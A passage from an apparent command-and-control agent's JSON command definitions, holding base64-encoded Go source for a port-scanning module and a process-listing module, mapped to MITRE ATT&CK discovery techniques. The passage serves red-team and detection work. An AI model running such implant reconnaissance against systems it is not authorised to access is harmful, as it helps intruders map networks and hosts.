GludCkgewoJCQlkZWZlciBzZXJ2ZXIubG9jay5SZWxlYXNlKDEpCgkJCWRlZmVyIHdnLkRvbmUoKQoJCQlzZXJ2ZXIuU2NhblBvcnQocG9ydCwgdGltZW91dCkKCQl9KHBvcnQpCgl9Cgl3Zy5XYWl0KCkKfQoKLy8gU2NhbiBhIHNtYXR0ZXJpbmcgb2YgcG9ydHMgYmFzZWQgb24gdGhlIHNsaWNlLgpmdW5jIChzZXJ2ZXIgKmhvc3QpIFNjYW5Qb3J0UmFuZ2VzKHBvcnRMaXN0IFtdUG9ydFJhbmdlLCB3YWl0VGltZSB0aW1lLkR1cmF0aW9uKSB7CgkvLyBtYXliZSBzdGFydCB0aHJlYWRpbmcgc2NhbiBoZXJlCgkvLyBsaW0gOj0gVWxpbWl0KCkgLyAyCgoJZm9yIGkgOj0gMDsgaSA8IGxlbihwb3J0TGlzdCk7IGkrKyB7CgkJc2VydmVyLlNjYW5Qb3J0UmFuZ2UocG9ydExpc3RbaV0sIHdhaXRUaW1lKQoJfQp9CgpmdW5jIChjaWRyUmFuZ2UgKkNJRFIpIFNjYW5Ib3N0cyhwb3J0TGlzdCBbXVBvcnRSYW5nZSwgd2FpdFRpbWUgdGltZS5EdXJhdGlvbiwgam9iICpzdHJ1Y3RzLkpvYikgewoJd2cgOj0gc3luYy5XYWl0R3JvdXB7fQoJZm9yIGkgOj0gMDsgaSA8IGxlbihjaWRyUmFuZ2UuSG9zdHMpOyBpKysgewoJCWlmICpqb2IuU3RvcCA+IDAgewoJCQlicmVhawoJCX0KCQlzZXJ2ZXIgOj0gY2lkclJhbmdlLkhvc3RzW2ldCgkJd2cuQWRkKDEpCgkJZ28gZnVuYyhzZXJ2ZXIgKmhvc3QsIHBvcnRMaXN0IFtdUG9ydFJhbmdlLCB3YWl0VGltZSB0aW1lLkR1cmF0aW9uKSB7CgkJCWRlZmVyIHdnLkRvbmUoKQoJCQlzZXJ2ZXIuU2NhblBvcnRSYW5nZXMocG9ydExpc3QsIHdhaXRUaW1lKQoJCX0oc2VydmVyLCBwb3J0TGlzdCwgd2FpdFRpbWUpCgl9Cgl3Zy5XYWl0KCkKfQoKZnVuYyAoc2VydmVyICpob3N0KSBGb3JtYXRPcGVuUG9ydHMoKSBzdHJpbmcgewoJaWYgbGVuKHNlcnZlci5PcGVuUG9ydHMpID09IDAgewoJCXJldHVybiAiIgoJfQoJcmVzdWx0IDo9ICIiCglyZXN1bHQgKz0gZm10LlNwcmludGYoIlNjYW4gcmVzdWx0cyBmb3IgJXM6XG4iLCBzZXJ2ZXIuUHJldHR5TmFtZSkKCXRvdGFsV2hpdGVTcGFjZSA6PSA2Cglmb3IgaSA6PSAwOyBpIDwgbGVuKHNlcnZlci5PcGVuUG9ydHMpOyBpKysgewoJCXJlc3VsdCArPSBmbXQuU3ByaW50ZigiXHQlZCVzb3BlblxuIiwgc2VydmVyLk9wZW5Qb3J0c1tpXSwgc3RyaW5ncy5SZXBlYXQoIiAiLCB0b3RhbFdoaXRlU3BhY2UtbGVuKHN0cmNvbnYuSXRvYShzZXJ2ZXIuT3BlblBvcnRzW2ldKSkpKQoJfQoJcmVzdWx0ICs9IGZtdC5TcHJpbnQoIlxuIikKCXJldHVybiByZXN1bHQKfQoKZnVuYyAoc2VydmVyICpob3N0KSBHcmVwcGFibGVTdHJpbmcoKSBzdHJpbmcgewoJaWYgbGVuKHNlcnZlci5PcGVuUG9ydHMpID09IDAgewoJCXJldHVybiAiIgoJfQoJdG90YWxXaGl0ZVNwYWNlIDo9IDQ1IC8vIGFyYml0cmFyeSBhbXQKCXBhZGRpbmcgOj0gdG90YWxXaGl0ZVNwYWNlIC0gbGVuKHNlcnZlci5QcmV0dHlOYW1lKQoJaWYgcGFkZGluZyA8IDEgewoJCXBhZGRpbmcgPSAxCgl9Cglwb3J0U3RyaW5nIDo9ICIoIgoJZm9yIGkgOj0gMDsgaSA8IGxlbihzZXJ2ZXIuT3BlblBvcnRzKTsgaSsrIHsKCQlhZGRTdHIgOj0gZm10LlNwcmludGYoIiVkL29wZW4iLCBzZXJ2ZXIuT3BlblBvcnRzW2ldKQoJCWlmIGkgIT0gKGxlbihzZXJ2ZXIuT3BlblBvcnRzKSAtIDEpIHsKCQkJYWRkU3RyICs9ICIsICIKCQl9CgkJcG9ydFN0cmluZyArPSBhZGRTdHIKCX0KCXBvcnRTdHJpbmcgKz0gIikiCglsaW5lIDo9IGZtdC5TcHJpbnRmKCIlcyVzJXMiLCBzZXJ2ZXIuUHJldHR5TmFtZSwgc3RyaW5ncy5SZXBlYXQoIiAiLCBwYWRkaW5nKSwgcG9ydFN0cmluZykKCXJldHVybiBsaW5lCn0KCmZ1bmMgKGNpZHJSYW5nZSAqQ0lEUikgRm9ybWF0T3BlblBvcnRzKCkgc3RyaW5nIHsKCXJlc3VsdHMgOj0gIiIKCWZvciBpIDo9IDA7IGkgPCBsZW4oY2lkclJhbmdlLkhvc3RzKTsgaSsrIHsKCQlyZXN1bHRzICs9IGNpZHJSYW5nZS5Ib3N0c1tpXS5Gb3JtYXRPcGVuUG9ydHMoKQoJfQoJcmV0dXJuIHJlc3VsdHMKfQo="
            },
            {
              "portscan.go": "cGFja2FnZSBwb3J0c2NhbgoKaW1wb3J0ICgKCSJlbmNvZGluZy9qc29uIgoJImxvZyIKCSJzdHJjb252IgoJInN0cmluZ3MiCgkidGltZSIKCgkicGtnL3V0aWxzL3N0cnVjdHMiCgkic3luYyIKCSJwa2cvcHJvZmlsZXMiCikKCgoKdmFyICgKCW11IHN5bmMuTXV0ZXgKCXNjYW5SZXN1bHRDaGFubmVsID0gbWFrZShjaGFuIGhvc3QpCikKCnR5cGUgUG9ydFNjYW5QYXJhbXMgc3RydWN0IHsKCUhvc3RzIFtdc3RyaW5nIGBqc29uOiJob3N0cyJgIC8vIENhbiBhbHNvIGJlIGEgY2lkcgoJUG9ydHMgc3RyaW5nICAgYGpzb246InBvcnRzImAKfQoKZnVuYyBkb1NjYW4oaG9zdExpc3QgW11zdHJpbmcsIHBvcnRMaXN0U3RycyBbXXN0cmluZywgam9iICpzdHJ1Y3RzLkpvYikgW11DSURSIHsKCS8vIFZhcmlhYmxlIGRlY2xhcmF0aW9ucwoJdGltZW91dCA6PSB0aW1lLkR1cmF0aW9uKDUwMCkgKiB0aW1lLk1pbGxpc2Vjb25kCgl2YXIgcG9ydExpc3QgW11Qb3J0UmFuZ2UKCgkvLyBwb3B1bGF0ZSB0aGUgcG9ydExpc3QKCWZvciBpIDo9IDA7IGkgPCBsZW4ocG9ydExpc3RTdHJzKTsgaSsrIHsKCQlpZiBzdHJpbmdzLkNvbnRhaW5zKHBvcnRMaXN0U3Ryc1tpXSwgIi0iKSAmJiBsZW4ocG9ydExpc3RTdHJzKSA9PSAxIHsKCQkJLy8gVGhleSB3YW50IGFsbCB0aGUgcG9ydHMKCQkJYWxsUG9ydHMgOj0gUG9ydFJhbmdlezEsIDY1NTM1fQoJCQl2YXIgbmV3TGlzdCBbXVBvcnRSYW5nZQoJCQluZXdMaXN0ID0gYXBwZW5kKG5ld0xpc3QsIGFsbFBvcnRzKQoJCQlwb3J0TGlzdCA9IG5ld0xpc3QKCQkJYnJlYWsKCQl9CgkJdmFyIHRtcFJhbmdlIFBvcnRSYW5nZQoJCWlmIHN0cmluZ3MuQ29udGFpbnMocG9ydExpc3RTdHJzW2ldLCAiLSIpIHsKCQkJcGFydHMgOj0gc3RyaW5ncy5TcGxpdChwb3J0TGlzdFN0cnNbaV0sICItIikKCQkJc3RhcnQsIGVyciA6PSBzdHJjb252LkF0b2kocGFydHNbMF0pCgkJCWlmIGVyciA9PSBuaWwgewoJCQkJZW5kLCBlcnIgOj0gc3RyY29udi5BdG9pKHBhcnRzWzFdKQoJCQkJaWYgZXJyID09IG5pbCB7CgkJCQkJdG1wUmFuZ2UgPSBQb3J0UmFuZ2V7CgkJCQkJCVN0YXJ0OiBzdGFydCwKCQkJCQkJRW5kOiAgIGVuZCwKCQkJCQl9CgkJCQkJcG9ydExpc3QgPSBhcHBlbmQocG9ydExpc3QsIHRtcFJhbmdlKQoJCQkJfQoJCQl9CgkJfSBlbHNlIHsKCQkJaW50UG9ydCwgZXJyIDo9IHN0cmNvbnYuQXRvaShwb3J0TGlzdFN0cnNbaV0pCgkJCWlmIGVyciA9PSBuaWwgewoJCQkJdG1wUmFuZ2UgPSBQb3J0UmFuZ2V7CgkJCQkJU3RhcnQ6IGludFBvcnQsCgkJCQkJRW5kOiAgIGludFBvcnQsCgkJCQl9CgkJCQlwb3J0TGlzdCA9IGFwcGVuZChwb3J0TGlzdCwgdG1wUmFuZ2UpCgkJCX0KCQl9Cgl9CgoJLy8gdmFyIGNpZHJzIFtdKkNJRFIKCgl2YXIgcmVzdWx0cyBbXUNJRFIKCS8vIFNjYW4gdGhlIGhvc3RzCglnbyBqb2IuTW9uaXRvclN0b3AoKQoJZm9yIGkgOj0gMDsgaSA8IGxlbihob3N0TGlzdCk7IGkrKyB7CgkJbmV3Q2lkciwgZXJyIDo9IE5ld0NJRFIoaG9zdExpc3RbaV0pCgkJaWYgZXJyICE9IG5pbCB7CgkJCWNvbnRpbnVlCgkJfSBlbHNlIHsKCQkJLy8gSXRlcmF0ZSB0aHJvdWdoIGV2ZXJ5IGhvc3QgaW4gaG9zdENpZHIKCQkJbmV3Q2lkci5TY2FuSG9zdHMocG9ydExpc3QsIHRpbWVvdXQsIGpvYikKCQkJcmVzdWx0cyA9IGFwcGVuZChyZXN1bHRzLCAqbmV3Q2lkcikKCQkJLy8gY2lkcnMgPSBhcHBlbmQoY2lkcnMsIG5ld0NpZHIpCgkJfQoJfQoKCXJldHVybiByZXN1bHRzCn0KCmZ1bmMgUnVuKHRhc2sgc3RydWN0cy5UYXNrKSB7Cgltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9Cgltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCXBhcmFtcyA6PSBQb3J0U2NhblBhcmFtc3t9CgoJZXJyIDo9IGpzb24uVW5tYXJzaGFsKFtdYnl0ZSh0YXNrLlBhcmFtcyksICZwYXJhbXMpCglpZiBlcnIgIT0gbmlsIHsKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CglpZiBsZW4ocGFyYW1zLkhvc3RzKSA9PSAwIHsKCQltc2cuVXNlck91dHB1dCA9ICJObyBob3N0cyBnaXZlbiB0byBzY2FuIgoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoJaWYgbGVuKHBhcmFtcy5Qb3J0cykgPT0gMCB7CgkJbXNnLlVzZXJPdXRwdXQgPSAiTm8gcG9ydHMgZ2l2ZW4gdG8gc2NhbiIKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglwb3J0U3RyaW5ncyA6PSBzdHJpbmdzLlNwbGl0KHBhcmFtcy5Qb3J0cywgIiwiKQoJbG9nLlByaW50bG4oIkJlZ2lubmluZyBwb3J0c2Nhbi4uLiIpCglyZXN1bHRzIDo9IGRvU2NhbihwYXJhbXMuSG9zdHMsIHBvcnRTdHJpbmdzLCB0YXNrLkpvYikKCWlmIHRhc2suSm9iLk1vbml0b3JpbmcgewoJCWdvIHRhc2suSm9iLlNlbmRLaWxsKCkKCX0KCS8vIGxvZy5QcmludGxuKCJGaW5pc2hlZCEiKQoJZGF0YSwgZXJyIDo9IGpzb24uTWFyc2hhbEluZGVudChyZXN1bHRzLCAiIiwgIiAgICAiKQoJLy8gLy8gZm10LlByaW50bG4oIkRhdGE6Iiwgc3RyaW5nKGRhdGEpKQoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfSAKCS8vIGZtdC5QcmludGxuKCJTZW5kaW5nIG9uIHVwIHRoZSBkYXRhOlxuIiwgc3RyaW5nKGRhdGEpKQoJbXNnLlVzZXJPdXRwdXQgPSBzdHJpbmcoZGF0YSkKCW1zZy5Db21wbGV0ZWQgPSB0cnVlCglyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgltdS5Mb2NrKCkKCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCW11LlVubG9jaygpCglyZXR1cm4KfQo="
            }
          ],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpIHsNCiAgICBjb25zdCBjYXBpdGFsaXplID0gKHMpID0+IHsNCiAgICAgICAgaWYgKHR5cGVvZiBzICE9PSAnc3RyaW5nJykgcmV0dXJuICcnDQogICAgICAgIHJldHVybiBzLmNoYXJBdCgwKS50b1VwcGVyQ2FzZSgpICsgcy5zbGljZSgxKQ0KICAgIH07DQogICAgdmFyIHRvdGFsX291dHB1dCA9ICIiOw0KICAgIHZhciB0b3RhbF9yZXN1bHRzID0gIiI7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCByZXNwb25zZS5sZW5ndGg7IGkrKykgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgdG90YWxfcmVzdWx0cyArPSByZXNwb25zZVtpXVsicmVzcG9uc2UiXTsNCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIHJldHVybiByZXNwb25zZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICB2YXIgZGF0YSA9IEpTT04ucGFyc2UodG90YWxfcmVzdWx0cyk7DQoNCiAgICBmb3IgKGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKykgew0KICAgIAlvdXRwdXQgPSAiIjsNCiAgICAJdmFyIHJvd19zdHlsZSA9ICIiOw0KICAgIAl2YXIgcm93cyA9IFtdOw0KICAgIAl2YXIgY2VsbF9zdHlsZSA9IHsNCiAgICAgICAgICAgICJoaWRkZW4iOiAidGV4dC1hbGlnbjpjZW50ZXIiLA0KICAgICAgICAgICAgInR5cGUiOiAidGV4dC1hbGlnbjpjZW50ZXIiDQogICAgICAgIH07DQogICAgICAgIHZhciBhZGRlZEhlYWRlciA9IGZhbHNlOw0KICAgICAgICB2YXIgaGVhZGVyRGl2ID0gJzxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIHNoYWRvdyIgc3R5bGU9InRvcDogMHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiAjMjBCMkFBOyBjb2xvcjogd2hpdGU7Ij48Yj4nICsgZGF0YVtpXVsicmFuZ2UiXSArICc8L2I+PC9kaXY+JzsNCiAgICAgICAgZm9yIChqID0gMDsgaiA8IGRhdGFbaV1bImhvc3RzIl0ubGVuZ3RoOyBqKyspIHsNCiAgICAgICAgCWlmIChkYXRhW2ldWyJob3N0cyJdW2pdWyJvcGVuX3BvcnRzIl0gIT0gbnVsbCkgew0KICAgICAgICAJCWlmICghYWRkZWRIZWFkZXIpIHsNCiAgICAgICAgCQkJb3V0cHV0ICs9IGhlYWRlckRpdjsNCiAgICAgICAgCQkJYWRkZWRIZWFkZXIgPSB0cnVlOw0KICAgICAgICAJCX0NCiAgICAgICAgCQl2YXIgaG9zdCA9IGRhdGFbaV1bImhvc3RzIl1bal07DQogICAgICAgIAkJcm93cy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgIk9wZW4gUG9ydHMiOiBob3N0WyJvcGVuX3BvcnRzIl0uam9pbigiLCAiKSwNCiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOiBob3N0WyJwcmV0dHlfbmFtZSJdLA0KICAgICAgICAgICAgICAgICAgICAicm93LXN0eWxlIjogcm93X3N0eWxlLA0KICAgICAgICAgICAgICAgICAgICAiY2VsbC1zdHlsZSI6IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICJoaWRkZW4iOiAidGV4dC1hbGlnbjpjZW50ZXIiLA0KICAgICAgICAgICAgICAgICAgICAgICAgInR5cGUiOiAidGV4dC1hbGlnbjpjZW50ZXIiDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgCX0NCiAgICAgICAgfQ0KICAgICAgICBpZiAocm93cy5sZW5ndGggIT0gMCkgew0KICAgICAgICAJb3V0cHV0ICs9IHN1cHBvcnRfc2NyaXB0c1snY3JlYXRlX3RhYmxlJ10oW3sNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJPcGVuIFBvcnRzIiwNCiAgICAgICAgICAgICAgICAic2l6ZSI6ICIxZW0iDQogICAgICAgICAgICB9LCB7DQogICAgICAgICAgICAgICAgIm5hbWUiOiAiSG9zdCIsDQogICAgICAgICAgICAgICAgInNpemUiOiAiMWVtIg0KICAgICAgICAgICAgfV0sIHJvd3MpOw0KICAgICAgICAgICAgb3V0cHV0ICs9ICI8YnIgLz4iOw0KICAgICAgICAgICAgdG90YWxfb3V0cHV0ICs9IG91dHB1dDsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gdG90YWxfb3V0cHV0Ow0KfQ=="
        },
        {
          "needs_admin": false,
          "help_cmd": "ps",
          "version": 4,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": true,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Get a process listing",
          "cmd": "ps",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1057",
              "attack_name": "Process Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "ps_linux.go": "Ly8gK2J1aWxkIGxpbnV4CgpwYWNrYWdlIHBzCgppbXBvcnQgKAoJImZtdCIKCSJpbyIKCSJpby9pb3V0aWwiCgkib3MiCgkib3MvdXNlciIKCSJzdHJjb252IgoJInN0cmluZ3MiCgkic3lzY2FsbCIKKQoKLy8gVW5peFByb2Nlc3MgaXMgYW4gaW1wbGVtZW50YXRpb24gb2YgUHJvY2VzcwovLyB0aGF0IGNvbnRhaW5zIFVuaXgtc3BlY2lmaWMgZmllbGRzIGFuZCBpbmZvcm1hdGlvbi4KdHlwZSBVbml4UHJvY2VzcyBzdHJ1Y3QgewoJcGlkICAgICAgICAgIGludAoJcHBpZCAgICAgICAgIGludAoJc3RhdGUgICAgICAgIHJ1bmUKCXBncnAgICAgICAgICBpbnQKCXNpZCAgICAgICAgICBpbnQKCWFyY2hpdGVjdHVyZSBzdHJpbmcKCWJpbmFyeSAgICAgICBzdHJpbmcKCW93bmVyICAgICAgICBzdHJpbmcKCWJpbl9wYXRoICAgICBzdHJpbmcKfQoKLy8gUGlkIHJldHVybnMgdGhlIHByb2Nlc3MgaWRlbnRpZmllcgpmdW5jIChwICpVbml4UHJvY2VzcykgUGlkKCkgaW50IHsKCXJldHVybiBwLnBpZAp9CgovLyBQUGlkIHJldHVybnMgdGhlIHBhcmVudCBwcm9jZXNzIGlkZW50aWZpZXIKZnVuYyAocCAqVW5peFByb2Nlc3MpIFBQaWQoKSBpbnQgewoJcmV0dXJuIHAucHBpZAp9CgpmdW5jIChwICpVbml4UHJvY2VzcykgQXJjaCgpIHN0cmluZyB7CglyZXR1cm4gcC5hcmNoaXRlY3R1cmUKfQoKLy8gRXhlY3V0YWJsZSByZXR1cm5zIHRoZSBwcm9jZXNzIG5hbWUKZnVuYyAocCAqVW5peFByb2Nlc3MpIEV4ZWN1dGFibGUoKSBzdHJpbmcgewoJcmV0dXJuIHAuYmluYXJ5Cn0KCi8vIE93bmVyIHJldHVybnMgdGhlIHVzZXJuYW1lIHRoZSBwcm9jZXNzIGJlbG9uZ3MgdG8KZnVuYyAocCAqVW5peFByb2Nlc3MpIE93bmVyKCkgc3RyaW5nIHsKCXJldHVybiBwLm93bmVyCn0KCmZ1bmMgKHAgKlVuaXhQcm9jZXNzKSBCaW5QYXRoKCkgc3RyaW5nIHsKCXJldHVybiBwLmJpbl9wYXRoCn0KZnVuYyBnZXRQcm9jZXNzQ21kbGluZShwaWQgaW50KSBzdHJpbmd7CglmaWxlbmFtZSA6PSBmbXQuU3ByaW50ZigiL3Byb2MvJWQvY21kbGluZSIsIHBpZCkKCWYsIF8gOj0gaW91dGlsLlJlYWRGaWxlKGZpbGVuYW1lKQoJcmV0dXJuIHN0cmluZyhmKQp9CmZ1bmMgZ2V0UHJvY2Vzc093bmVyKHBpZCBpbnQpIChzdHJpbmcsIGVycm9yKSB7CglmaWxlbmFtZSA6PSBmbXQuU3ByaW50ZigiL3Byb2MvJWQvdGFzayIsIHBpZCkKCWYsIF8gOj0gb3MuT3BlbihmaWxlbmFtZSkKCWRlZmVyIGYuQ2xvc2UoKQoJZmlsZVN0YXQgOj0gJnN5c2NhbGwuU3RhdF90e30KCWVyciA6PSBzeXNjYWxsLkZzdGF0KGludChmLkZkKCkpLCBmaWxlU3RhdCkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiAiIiwgZXJyCgl9Cgl1c3IsIGVyciA6PSB1c2VyLkxvb2t1cElkKGZtdC5TcHJpbnRmKCIlZCIsIGZpbGVTdGF0LlVpZCkpCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gIiIsIGVycgoJfQoJcmV0dXJuIHVzci5Vc2VybmFtZSwgZXJyCn0KCi8vIFJlZnJlc2ggcmVsb2FkcyBhbGwgdGhlIGRhdGEgYXNzb2NpYXRlZCB3aXRoIHRoaXMgcHJvY2Vzcy4KZnVuYyAocCAqVW5peFByb2Nlc3MpIFJlZnJlc2goKSBlcnJvciB7CglzdGF0UGF0aCA6PSBmbXQuU3ByaW50ZigiL3Byb2MvJWQvc3RhdCIsIHAucGlkKQoJZGF0YUJ5dGVzLCBlcnIgOj0gaW91dGlsLlJlYWRGaWxlKHN0YXRQYXRoKQoJaWYgZXJyICE9IG5pbCB7CgkJcmV0dXJuIGVycgoJfQoKCS8vIEZpcnN0LCBwYXJzZSBvdXQgdGhlIGltYWdlIG5hbWUKCWRhdGEgOj0gc3RyaW5nKGRhdGFCeXRlcykKCWJpblN0YXJ0IDo9IHN0cmluZ3MuSW5kZXhSdW5lKGRhdGEsICcoJykgKyAxCgliaW5FbmQgOj0gc3RyaW5ncy5JbmRleFJ1bmUoZGF0YVtiaW5TdGFydDpdLCAnKScpCglwLmJpbmFyeSA9IGRhdGFbYmluU3RhcnQgOiBiaW5TdGFydCtiaW5FbmRdCgoJLy8gTW92ZSBwYXN0IHRoZSBpbWFnZSBuYW1lIGFuZCBzdGFydCBwYXJzaW5nIHRoZSByZXN0CglkYXRhID0gZGF0YVtiaW5TdGFydCtiaW5FbmQrMjpdCglfLCBlcnIgPSBmbXQuU3NjYW5mKGRhdGEsCgkJIiVjICVkICVkICVkIiwKCQkmcC5zdGF0ZSwKCQkmcC5wcGlkLAoJCSZwLnBncnAsCgkJJnAuc2lkKQoKCXJldHVybiBlcnIKfQoKZnVuYyBmaW5kUHJvY2VzcyhwaWQgaW50KSAoUHJvY2VzcywgZXJyb3IpIHsKCXBzLCBlcnIgOj0gcHJvY2Vzc2VzKCkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiBuaWwsIGVycgoJfQoJZm9yIF8sIHAgOj0gcmFuZ2UgcHMgewoJCWlmIHAuUGlkKCkgPT0gcGlkIHsKCQkJcmV0dXJuIHAsIG5pbAoJCX0KCX0KCXJldHVybiBuaWwsIGZtdC5FcnJvcmYoIm5vIHByb2Nlc3MgZm91bmQgZm9yIHBpZCAlZCIsIHBpZCkKfQoKZnVuYyBwcm9jZXNzZXMoKSAoW11Qcm9jZXNzLCBlcnJvcikgewoJZCwgZXJyIDo9IG9zLk9wZW4oIi9wcm9jIikKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiBuaWwsIGVycgoJfQoJZGVmZXIgZC5DbG9zZSgpCgoJcmVzdWx0cyA6PSBtYWtlKFtdUHJvY2VzcywgMCwgNTApCglmb3IgewoJCWZpcywgZXJyIDo9IGQuUmVhZGRpcigxMCkKCQlpZiBlcnIgPT0gaW8uRU9GIHsKCQkJYnJlYWsKCQl9CgkJaWYgZXJyICE9IG5pbCB7CgkJCXJldHVybiBuaWwsIGVycgoJCX0KCgkJZm9yIF8sIGZpIDo9IHJhbmdlIGZpcyB7CgkJCS8vIFdlIG9ubHkgY2FyZSBhYm91dCBkaXJlY3Rvcmllcywgc2luY2UgYWxsIHBpZHMgYXJlIGRpcnMKCQkJaWYgIWZpLklzRGlyKCkgewoJCQkJY29udGludWUKCQkJfQoJCQkvLyBXZSBvbmx5IGNhcmUgaWYgdGhlIG5hbWUgc3RhcnRzIHdpdGggYSBudW1lcmljCgkJCW5hbWUgOj0gZmkuTmFtZSgpCgkJCWlmIG5hbWVbMF0gPCAnMCcgfHwgbmFtZVswXSA+ICc5JyB7CgkJCQljb250aW51ZQoJCQl9CgkJCS8vIEZyb20gdGhpcyBwb2ludCBmb3J3YXJkLCBhbnkgZXJyb3JzIHdlIGp1c3QgaWdub3JlLCBiZWNhdXNlCgkJCS8vIGl0IG1pZ2h0IHNpbXBseSBiZSB0aGF0IHRoZSBwcm9jZXNzIGRvZXNuJ3QgZXhpc3QgYW55bW9yZS4KCQkJcGlkLCBlcnIgOj0gc3RyY29udi5QYXJzZUludChuYW1lLCAxMCwgMCkKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQljb250aW51ZQoJCQl9CgkJCXAsIGVyciA6PSBuZXdVbml4UHJvY2VzcyhpbnQocGlkKSkKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQljb250aW51ZQoJCQl9CgkJCXAub3duZXIsIGVyciA9IGdldFByb2Nlc3NPd25lcihpbnQocGlkKSkKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQljb250aW51ZQoJCQl9CgkJCXAuYmluX3BhdGggPSBnZXRQcm9jZXNzQ21kbGluZShpbnQocGlkKSkKCQkJcmVzdWx0cyA9IGFwcGVuZChyZXN1bHRzLCBwKQoJCX0KCX0KCXJldHVybiByZXN1bHRzLCBuaWwKfQoKZnVuYyBuZXdVbml4UHJvY2VzcyhwaWQgaW50KSAoKlVuaXhQcm9jZXNzLCBlcnJvcikgewoJcCA6PSAmVW5peFByb2Nlc3N7cGlkOiBwaWR9CglyZXR1cm4gcCwgcC5SZWZyZXNoKCkKfQo="
            },
            {
              "ps_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSBwcwoKaW1wb3J0ICgKCSJieXRlcyIKCSJlbmNvZGluZy9iaW5hcnkiCgkic3lzY2FsbCIKCSJ1bnNhZmUiCikKCnR5cGUgRGFyd2luUHJvY2VzcyBzdHJ1Y3QgewoJcGlkICAgICAgICAgIGludAoJcHBpZCAgICAgICAgIGludAoJYmluYXJ5ICAgICAgIHN0cmluZwoJYXJjaGl0ZWN0dXJlIHN0cmluZwoJb3duZXIgICAgICAgIHN0cmluZwp9CgpmdW5jIChwICpEYXJ3aW5Qcm9jZXNzKSBQaWQoKSBpbnQgewoJcmV0dXJuIHAucGlkCn0KCmZ1bmMgKHAgKkRhcndpblByb2Nlc3MpIFBQaWQoKSBpbnQgewoJcmV0dXJuIHAucHBpZAp9CgpmdW5jIChwICpEYXJ3aW5Qcm9jZXNzKSBFeGVjdXRhYmxlKCkgc3RyaW5nIHsKCXJldHVybiBwLmJpbmFyeQp9CgpmdW5jIChwICpEYXJ3aW5Qcm9jZXNzKSBBcmNoKCkgc3RyaW5nIHsKCXJldHVybiBwLmFyY2hpdGVjdHVyZQp9CgpmdW5jIChwICpEYXJ3aW5Qcm9jZXNzKSBPd25lcigpIHN0cmluZyB7CglyZXR1cm4gcC5vd25lcgp9CgpmdW5jIChwICpEYXJ3aW5Qcm9jZXNzKSBCaW5QYXRoKCkgc3RyaW5nIHsKCXJldHVybiBwLmJpbmFyeQp9CmZ1bmMgZmluZFByb2Nlc3MocGlkIGludCkgKFByb2Nlc3MsIGVycm9yKSB7CglwcywgZXJyIDo9IHByb2Nlc3NlcygpCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gbmlsLCBlcnIKCX0KCglmb3IgXywgcCA6PSByYW5n